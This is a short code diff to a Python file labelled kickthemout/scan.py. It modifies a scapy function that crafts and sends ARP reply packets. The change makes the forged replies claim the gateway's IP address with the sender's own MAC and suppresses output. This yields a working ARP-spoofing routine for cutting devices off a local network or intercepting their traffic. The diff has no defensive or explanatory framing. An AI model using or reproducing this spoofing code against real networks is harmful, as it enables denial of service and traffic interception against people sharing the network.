@@ -1,6 +1,6 @@
 #kickthemout/scan.py by @xdavidhu
 
-def sendPacket(my_mac, interface, my_ip, target_ip, target_mac):
+def sendPacket(my_mac, gateway_ip, target_ip, target_mac):
 
     import sys
     from scapy.all import (
@@ -15,7 +15,7 @@ def sendPacket(my_mac, interface, my_ip, target_ip, target_mac):
     ether.src = my_mac
 
     arp = ARP()
-    arp.psrc = my_ip
+    arp.psrc = gateway_ip
     arp.hwsrc = my_mac
 
     arp = arp
@@ -28,4 +28,4 @@ def sendPacket(my_mac, interface, my_ip, target_ip, target_mac):
 
     arp.op = 2
     packet = ether/arp
-    sendp(x=packet)
+    sendp(x=packet, verbose=False)
